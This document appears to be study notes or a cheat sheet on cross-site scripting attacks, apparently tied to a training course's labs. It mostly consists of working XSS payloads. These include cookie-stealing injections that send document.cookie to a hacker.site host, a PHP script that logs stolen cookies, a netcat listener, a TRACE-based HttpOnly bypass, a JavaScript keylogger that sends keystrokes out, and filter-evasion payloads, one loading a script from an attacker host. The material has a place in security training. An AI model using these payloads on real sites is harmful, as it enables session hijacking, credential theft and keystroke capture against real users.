# XSS



### Stealing cookies

```
new Image().src ="http://hacker.site/C.php?cc ="+escape(document.cookie);
```



Script variable:

```
<script>var a = ">>INJ<<"; </script>
	"; new Image().src ="http://hacker.site/C.php?cc ="+escape(document.cookie);//
	";new Audio().src="http://hacker.site/C.php?cc="+escape(document.cookie);//
```



Attribute:

```
<div id=">>INJ<<">
	x" onmouseover="new Image().src ='http://hacker.site/C.php?cc ='+escape(document.cookie)


<video width="320" height=">>INJ<<">
	240" src=x onerror="new Audio().src='http://hacker.site/C.php?cc='+escape(document.cookie)
```



href:

```
<a href=">>INJ<<">
	x" onclick="new Image().src ='http://hacker.site/C.php?cc ='+escape(document.cookie)
```



c.php

```
<?php

error_reporting(0);
$cookie = $_GET['cc'];
$file = '_cc_.txt';
$handle = fopen($file, "a");
fwrite($handle, $cookie.'\n');
fclose($handle);
echo "<h1>Hello</h1>"

?>
```





**steal cookies with nc**

```
<script>new Image().src ="http://ip:port/?cc ="+escape(document.cookie);</script>

attacker:
nc -nvlp 4444
```









### Bypassing HTTPOnly Flag

#### XST(Cross Site Tracing)

By starting a **TRACE** connection with the victim server, we will receive our request back. Additionally, if we send HTTP headers, normally inaccessible to JavaScript (IE: Cookie ), we will be able to read them! Below is a simple TRACE request that simulates the sending of a custom header Test . We used cURL but you can obtain the same result using other tools.

```
curl victim.site -X TRACE
```

Since we are trying to steal protected cookies by exploiting an XSS, we need to perform this kind of request using a web browser.

 With this way, we will send the protected cookies in the TRACE request and then be able to read them in the response!



In JavaScript, there is the **XMLHttpRequest** object that provides an easy way to retrieve data from a URL. It allows us to do this without having to do a full page refresh. Let’s look at how to create a simple TRACE request.

```
<script>
    var xhr = new XMLHttpRequest();
    var url = 'http://victim.site/';
    xhr.withCredentials = true;
    xhr.open('TRACE', url);

    function hand(){
        console.log(this.getAllresponseHeaders());
    }

    xhr.onreadystatechange = hand;
    xhr.send();
</script>
```

**Note:** This technique is very old and consequently modern browsers BLOCK the HTTP TRACE method in XMLHttpRequest and in other scripting languages and libraries, such as jQuery, Silverlight, Flash/ActionScript, etc.

Restrictions of XMLHttpRequest's getResponseHeader(): Returns all headers from the response, with the exception of those whose field name is `Set-Cookie` or `Set-Cookie2`.





### Defacements

- Virtual Defacement
- Persistent Defacement



### Phishing

A basic way to perform XSS Phishing is to alter the `action` attribute of the `<form>` tag in order to hijack the submitted form input.



### Keylogging

What a keylogger does is log keys hit on the victim keyboard. The approach here is the same as with cookie grabbing. We need client side code that captures the keystrokes and server side code that stores the keys sent.

#### JavaScript Example

```
var keys =""; // WHERE > where to store the key strokes
document.onkeypress = function(e) {
var get = window.event ? event : e;
var key = get.keyCode ? get.keyCode : get.charCode ;
key = String.fromCharCode (key);
keys += key;
}
window.setInterval(function(){
if(keys !== ""){
	// HOW > sends the key strokes via GET using an Image element to listening hacker.site server
	var path = encodeURI ("http://hacker.site/keylogger? k="+ keys);
	new Image().src = path;
	keys = "";
	}
}, 1000);
```



#### Keylogging with Metasploit

auxiliary(http_javascript_keylogger): The Metasploit auxiliary module is an advanced version of the previous " JavaScript example ". It creates the JavaScript payload which could be injected within the vulnerable web page and automatically starts the listening server.





### Labs

```
4.
<object data="javascript:alert('l33t')">

5.
why not ??
<script>alert`'l33t'`</script>
<script>alert&lpar;'l33t'&rpar;</script>	
<img src=x ONerror=alert`'l33t'`>

5. solved
<img src=x ONerror=alert&lpar;'l33t'&rpar;>		// HTML encode of ()
<svg><script>alert&lpar;'l33t'&rpar;</script>


6.
<img src=z onerror=confirm("l33t")>
<img src=z onerror=prompt("l33t")>
<svg><script>\u0061lert("l33t")</script>
<script>\u0061lert("l33t")</script>
<img src=x onerror="&#x0061;lert('l33t')"/>
<script>Function(\u0061lert("l33t"));</script>

7.
<script>\u{0061}lert("l33t")</script>
<script>Function(\u{0061}lert("l33t"));</script>
<script>eval('\x61lert("l33t")')</script>

8.
[press enter as a new line]eval('\x61lert("l33t")'

9. why not \u2028 eval('\x61lert("l33t")'
the solution did not work

9.
</script><img src=x onerror="\u0061lert('l33t')"/>

10.
<img src=x onerror=eval(&apos;a\l\ert\(\&apos;l33t\&apos;)&apos;)>
<script>eval(8680439..toString(30))(983801..toString(36))</script>

11.
http://11.xss.labs%2f@attacker.ine:8000/script.js    and from our machine write alert("l33t") in SCRIPT.JS and start python server
```

